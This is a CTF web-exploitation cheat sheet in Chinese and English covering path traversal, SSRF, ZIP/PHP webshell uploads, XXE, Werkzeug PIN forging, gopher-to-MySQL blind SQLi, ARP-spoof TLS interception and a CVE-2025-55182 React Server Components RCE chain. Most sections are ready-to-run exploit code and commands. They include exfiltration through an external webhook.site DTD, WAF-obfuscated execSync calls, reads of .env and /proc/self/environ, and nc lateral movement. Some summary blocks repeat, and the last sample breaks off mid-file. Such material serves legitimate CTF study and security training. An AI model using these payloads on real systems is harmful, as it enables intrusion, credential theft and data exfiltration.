# CTF Web - Path Traversal, SSRF, Upload and RSC

## 阅读定位

- 这是高级服务端技巧的 **主卷**，适合路径绕过、SSRF、上传、现代框架和复杂 server-side bug。
- 如果你还只是在处理普通 SQLi / SSTI / XXE / command injection，先回 php-lfi-ssti-ssrf-and-type-juggling.md 或 xml-command-and-graphql-injection.md。
- 如果主卷没覆盖当前问题，再按线索跳到补卷：parser-wrapper-and-legacy-ssrf-tricks.md 或 polyglot-url-tricks-and-ssrf-leaks.md。


## Table of Contents
- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)
- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch--command-injection-vuwctf-2025)
- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
  - [Brace Stripping](#brace-stripping)
  - [Double URL Encoding](#double-url-encoding)
  - [Python os.path.join](#python-ospathjoin)
- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
- [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
- [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
- [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
- [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
  - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
  - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
- [MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)](#mongodb-regex-injection--where-blind-oracle-nullcon-2026)
- [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
- [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
- [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
- [wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)](#wget-crlf-injection-for-ssrf-to-smtp-seccon-2017)
- [Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)](#gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018)
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
  - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
  - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
  - [Step 3 — Exfiltrate data via NEXT_REDIRECT](#step-3--exfiltrate-data-via-next_redirect)
  - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
  - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
  - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
- [AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)](#amqptls-interception-via-sslsplit--arpspoof-tamuctf-2019)
- [CairoSVG XXE via Oversized width= (BSidesSF 2019)](#cairosvg-xxe-via-oversized-width-bsidessf-2019)
- [Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)](#bazaar-bzr-repository-reconstruction-via-bzr-check-loop-stem-ctf-2019)
See also: parser-wrapper-and-legacy-ssrf-tricks.md for self-decrypting / string / lattice patterns (SSRF-to-Docker API RCE, Castor XML xsi:type deserialization, Apache ErrorDocument expression file read, SQLite file path traversal, HQL non-breaking space injection, base64-encoded path traversal, Windows 8.3 short filename bypass, URL parse_url @ symbol bypass, PHP zip:// wrapper LFI, XSS-to-SSTI chain, INSERT INTO column shift SQLi, session cookie forgery via timestamp PRNG).

---

## Path Traversal / SSRF / Upload 技巧族

### ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)

**Affected:** ExifTool ≤ 12.23

**Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.

**Craft minimal DjVu exploit:**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

---

### Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)

**模式（Go Go Cyber Ranger）：** Go validates `len([]rune(input)) > 32` but copies `len([]byte(input))` bytes.

**关键结论：** Multi-byte UTF-8 chars (emoji = 4 bytes) count as 1 rune but 4 bytes → overflow.

**Exploit:** 8 emoji (32 bytes, 8 runes) + `";cmd\n"` = 40 bytes total, passes 32-rune check but overflows into adjacent buffer.

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

---

### Zip Symlink Path Traversal (UTCTF 2024)

**模式（Schrödinger）：** Server extracts uploaded ZIP without checking symlinks.

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

---

### Path Traversal Bypass Techniques

### Brace Stripping
`{.}{.}/flag.txt` → `../flag.txt` after processing

### Double URL Encoding
`%252E%252E%252F` → `../` after two decode passes

### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)

---

### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)

```nginx
# Vulnerable Nginx configuration:
location /laravel {
    alias /var/www/html/public/;
}
# Note: /laravel has NO trailing slash, but alias has one
# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
```

```bash
# Exploit: traverse out of the public/ directory to read .env
GET /laravel../.env HTTP/1.1
# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env

# Read application source
GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1

# Read other config files
GET /laravel../config/database.php HTTP/1.1
GET /laravel../storage/logs/laravel.log HTTP/1.1
```

```python
import requests

target = "http://target"

# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
r = requests.get(f"{target}/laravel../.env")
if r.status_code == 200:
    print("[+] .env contents:")
    print(r.text)
    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
```

**Detection checklist:**
```text
# Test for the misconfiguration on common paths:
/static../
/assets../
/public../
/media../
/uploads../
/laravel../
# Any location block using alias without matching trailing slashes
```

**关键结论：** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.

---

### Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)

```bash
# Standard path traversal blocked by ASCII dot check:
curl "http://target/files/../../flag.txt"   # blocked: contains ".."

# U+2E2E homoglyph bypass:
curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
```

```python
import requests

# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations

homoglyph_dot = '\u2E2E'
payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"

r = requests.get(f"http://target/files/{payload}")
# If backend normalizes Unicode before filesystem access but after validation:
print(r.text)
```

**Other Unicode dot homoglyphs to try:**
```text
U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
```

**关键结论：** Unicode normalization inconsistencies between the validation layer and execution layer enable path traversal with non-ASCII dot homoglyphs. U+2E2E is a lesser-known alternative to fullwidth tricks (U+FF0E). Test normalization forms NFKC and NFC — Python's `unicodedata.normalize('NFKC', char)` reveals what each character collapses to.

---

### Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)

```ruby
# Regexp.escape escapes special chars by prepending backslash
# e.g., Regexp.escape("a.b") → "a\\.b"

# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
# Regexp.escape sees 0xBF → not a special char, passes through
# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
# The second backslash then escapes the NEXT character, not the intended one

# Result: subsequent input characters become unescaped in the regex
```

```python
# In a CTF context: HTTP request with GBK lead byte in parameter
import requests

# %bf%5c in URL-encoded form — in GBK this is one character
# When Ruby calls Regexp.escape on the input, the backslash is consumed
payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex

r = requests.get("http://target/search", params={"q": payload})
# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
# The .* passes through unescaped, matching any string
```

**Exploitation scenario:**
```ruby
# Vulnerable code:
pattern = /#{Regexp.escape(user_input)}/
if flag.match(pattern)
  puts "Match!"
end

# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
# In GBK context: first two bytes are one char, leaving ".*" unescaped
# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
```

**关键结论：** Byte-level escaping functions are vulnerable to multibyte character injection. A GBK/Big5 lead byte (0xBF) followed by 0x5C forms a valid single character, consuming the backslash that `Regexp.escape` just added. This leaves subsequent characters unescaped. Check for non-ASCII input handling in Ruby regex validation, especially when the application supports CJK character sets.

---

### /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)

```bash
# Bypass /proc filter to read environment variables
curl "http://target/?f=/dev/fd/../environ"
# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/

# Read command line
curl "http://target/?f=/dev/fd/../cmdline"

# Read memory maps
curl "http://target/?f=/dev/fd/../maps"

# Read specific file descriptor contents
curl "http://target/?f=/dev/fd/0"   # stdin
curl "http://target/?f=/dev/fd/1"   # stdout
curl "http://target/?f=/dev/fd/3"   # often a database or config file
```

**Other /proc filter bypass paths:**
```text
/dev/fd/../environ         # → /proc/self/environ
/dev/fd/../cmdline         # → /proc/self/cmdline
/dev/fd/../maps            # → /proc/self/maps
/dev/fd/../status          # → /proc/self/status
/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
```

**关键结论：** `/dev/fd` is a symlink to `/proc/self/fd` on Linux. Traversing up with `../` reaches `/proc/self/`, bypassing blocklist checks for the literal string `/proc`. Similarly, `/dev/stdin`, `/dev/stdout`, and `/dev/stderr` link into `/proc/self/fd/` and can be used as traversal pivot points. Always test these alternatives when `/proc` is blacklisted.

---

### Flask/Werkzeug Debug Mode Exploitation

**模式（Meowy, Nullcon 2026）：** Flask app with Werkzeug debugger enabled + weak session secret.

**Werkzeug debugger RCE:** If `/console` is accessible:
1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
3. **Compute PIN cookie:**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**关键结论：** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.

---

### Flask/Werkzeug Debug Mode

Weak session secret brute-force + forge admin session + Werkzeug debugger PIN RCE. See path-traversal-ssrf-upload-and-rsc.md for full attack chain.


---
### XXE with External DTD Filter Bypass

**模式（PDFile, PascalCTF 2026）：** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.

**Technique:** Host malicious DTD on webhook.site or attacker server:
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**关键结论：** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.

**Setup with webhook.site API:**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

### 速查补充

Host malicious DTD externally to bypass upload keyword filters. See path-traversal-ssrf-upload-and-rsc.md for payload and webhook.site setup.


---
### Path Traversal: URL-Encoded Slash Bypass

**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.

---

### 速查补充

`%2f` bypasses nginx route matching but filesystem resolves it. See path-traversal-ssrf-upload-and-rsc.md.


---
### WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)

**模式（Web 2 Doc 1/2）：** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.

### WeasyPrint SSRF & File Read (CVE-2024-28184)

`<a rel="attachment" href="file:///flag.txt">` or `<link rel="attachment" href="http://127.0.0.1/admin">` -- WeasyPrint embeds fetched content as PDF attachments, bypassing header checks. Boolean oracle via `/Type /EmbeddedFile` presence. See path-traversal-ssrf-upload-and-rsc.md and known-cves-and-n-day-exploits.md.


---
### Variant 1: Blind SSRF via Attachment Oracle
WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.

**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

### Variant 2: Local File Read via file:// Attachment
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`

**关键结论：** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.

---

### MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)

**模式（CVE DB）：** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.

**Injection payload:**
```text
a^/)||(<JS_CONDITION>)&&(/a^
```
This breaks the regex context and injects a boolean condition. Result count reveals truth value.

**Binary search extraction:**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

---

### MongoDB Regex / $where Blind Injection

Break out of `/.../i` with `a^/)||(<condition>)&&(/a^`. Binary search `charCodeAt()` for extraction. See path-traversal-ssrf-upload-and-rsc.md.


---
### Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)

**模式（WordPress Static Site Generator）：** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.

**Pongo2 SSTI payloads:**
```text
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

---

### Pongo2 / Go Template Injection

`{% include "/flag.txt" %}` in uploaded file + path traversal in template parameter. See path-traversal-ssrf-upload-and-rsc.md.


---
### ZIP Upload with PHP Webshell (Nullcon 2026)

**模式（virus_analyzer）：** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.

**Exploit:**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**Variants:**
- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
- Race condition: file may be deleted after extraction -- access immediately

---

### ZIP Upload with PHP Webshell

Upload ZIP containing `.php` file → extract to web-accessible dir → `file_get_contents('/flag.txt')`. See path-traversal-ssrf-upload-and-rsc.md.


---
### basename() Bypass for Hidden Files (Nullcon 2026)

**模式（Flowt Theory 2）：** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.

**Exploit:**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**关键结论：** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.

---

### basename() Bypass for Hidden Files

`basename()` only strips dirs, doesn't filter `.lock` or hidden files in same directory. See path-traversal-ssrf-upload-and-rsc.md.


---
### wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)

```text
# CRLF-injected URL targeting internal SMTP on port 25:
# Key: the port :25/ must come at the END to avoid "Bad port number" errors
http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
```

```python
import requests
import urllib.parse

# Build the CRLF-injected SMTP conversation
smtp_commands = "\r\n".join([
    "HELO x",
    "MAIL FROM:<attacker@x.com>",
    "RCPT TO:<root>",
    "DATA",
    "Subject: give me flag",
    "",
    "Send me the flag please",
    ".",
])

# URL-encode the SMTP commands for injection into the hostname
encoded = urllib.parse.quote(smtp_commands, safe='')

# Port must be at the end to avoid wget "Bad port number" error
ssrf_url = f"http://127.0.0.1{encoded}:25/"

# Trigger the SSRF
requests.post("http://target/fetch", data={"url": ssrf_url})
# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
# The SMTP server processes the injected commands and delivers the email
```

**关键结论：** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also php-lfi-ssti-ssrf-and-type-juggling.md for other SSRF techniques.

---

### Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)

```python
import urllib.parse
import requests
import time

# Step 1: Capture a real MySQL session with tcpdump
# tcpdump -i lo port 3306 -w mysql.pcap
# Connect to MySQL normally: mysql -u root
# Execute a simple query, then disconnect
# Extract the client auth packet and query packet bytes from the pcap

# Step 2: Build the gopher payload
# MySQL auth packet (handshake response) - extract from pcap
auth_packet = bytearray([
    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
    0x85, 0xa6, 0x03, 0x00,  # client capabilities
    # ... remaining auth packet bytes from tcpdump capture
])

# MySQL query packet
def build_query_packet(sql):
    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
    length = len(payload)
    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
    header = length.to_bytes(3, 'little') + b'\x00'
    return header + payload

# Step 3: Time-based blind extraction
flag = ""
for pos in range(1, 50):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
        query_packet = build_query_packet(query)

        # Combine auth + query, URL-encode for gopher
        raw_data = bytes(auth_packet) + bytes(query_packet)
        encoded = urllib.parse.quote(raw_data, safe='')

        # Double-encode if the SSRF handler URL-decodes once
        double_encoded = urllib.parse.quote(encoded, safe='')

        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"

        start = time.time()
        requests.get("http://target/fetch", params={"url": gopher_url})
        elapsed = time.time() - start

        if elapsed > 3.0:
            flag += char
            print(f"Flag so far: {flag}")
            break

print(f"Final flag: {flag}")
```

**关键结论：** `gopher://` sends raw TCP data, enabling communication with any TCP service. Capture a legitimate MySQL session with `tcpdump`, then replay the auth + query bytes via gopher. Use passwordless MySQL accounts (common in CTF setups). Double-URL-encode the payload when the SSRF handler URL-decodes once. This technique also works against PostgreSQL, Redis, and other TCP services accessible from the SSRF context. See also sql-injection.md for SQL injection techniques.

---

### React Server Components Flight Protocol RCE (Ehax 2026)

**模式（Flight Risk）：** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).

### Step 1 — Identify RSC via HTTP headers

Intercept form submissions in the Network tab. RSC-specific headers:
```http
POST / HTTP/1.1
Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
Accept: text/x-component
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
Content-Type: multipart/form-data; boundary=----x
```

Confirm the server function name in client JS bundles:
```javascript
createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
```

### Step 2 — Exploit Flight deserialization for RCE

Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.

Request structure:
```http
POST / HTTP/1.1
Host: target
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

THE FAKE FLIGHT CHUNK HERE
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

### Step 3 — Exfiltrate data via NEXT_REDIRECT

Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to exfiltrate data through the `x-action-redirect` response header:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
});
```

The server responds with:
```http
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<exfiltrated_data>;push
```

Example — confirm RCE with `process.pid`:
```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
});
// Response: x-action-redirect: /login?a=1;push
```

### Step 4 — Bypass WAF keyword filters

When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):

1. **String concatenation:**
   ```javascript
   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
   ```

2. **Hex encoding:**
   ```javascript
   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
   ```

3. **Combined in payload:**
   ```javascript
   var p=process;
   var m=p['main'+'Module'];
   var r=m['requ'+'ire'];
   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
   throw Object.assign(new Error('NEXT_REDIRECT'),
     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
   ```

### Step 5 — Post-RCE enumeration

```javascript
// Working directory
process.cwd()                        // → /app

// Process arguments
process.argv                         // → /usr/local/bin/node,/app/server.js

// List files
process.mainModule.require('fs').readdirSync(process.cwd()).join(',')

// Read files
process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')

// Check available modules
Object.keys(process.mainModule.require('http'))
```

### Step 6 — Lateral movement to internal services

After discovering internal services (e.g., from hint files):
```javascript
// Use nc to reach internal HTTP services
var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
).toString();
throw Object.assign(new Error('NEXT_REDIRECT'),
  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
```

**关键结论：** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.

**Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.

---

### 速查补充

Identify via `Next-Action` + `Accept: text/x-component` headers. CVE-2025-55182: fake Flight chunk exploits constructor chain for server-side JS execution. Exfiltrate via `NEXT_REDIRECT` error → `x-action-redirect` header. WAF bypass: `'chi'+'ld_pro'+'cess'` or hex `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`. See path-traversal-ssrf-upload-and-rsc.md and known-cves-and-n-day-exploits.md.
### AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)

```bash
# 1. Sit between the web server and the broker (both ways)
arpspoof -i eth0 -t 172.30.0.2 172.30.0.4 &
arpspoof -i eth0 -t 172.30.0.4 172.30.0.2 &

# 2. Redirect the AMQP port into sslsplit
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 5671 -j REDIRECT --to-ports 1234
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
mkdir /tmp/sslsplit logdir
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 1234
cat logdir/*    # shows plaintext AMQP frames with the JSON body

# 3. For on-the-fly rewriting, patch mitmproxy's raw TCP layer:
#    mitmproxy/proxy/protocol/rawtcp.py, RawTCPLayer._handle_server_message():
#        x = buf[:size].tobytes().replace(b'"user": "alice",', b'"user": "root", ')
#        tcp_message = tcp.TCPMessage(dst == server, x)
mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
          --tcp-hosts 172.30.0.2 --tcp-hosts 172.30.0.4
```

**关键结论：** Clients without certificate pinning accept any CA-signed cert; sslsplit terminates TLS and forwards plaintext to its log, so any TLS-wrapped protocol (AMQP, IRC, MQTT, LDAPS, custom binary) becomes observable and — with a trivial mitmproxy patch — modifiable. Burp and mitmproxy focus on HTTPS; for arbitrary protocols, reach for sslsplit/sslsniff plus a pinhole in the TCP layer.

**参考：** TAMUctf 2019 — Homework Help, writeup 13477

---

### CairoSVG XXE via Oversized width= (BSidesSF 2019)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xx SYSTEM "file:///proc/self/status">]>
<svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15" fill="red">test &xx;; test</text>
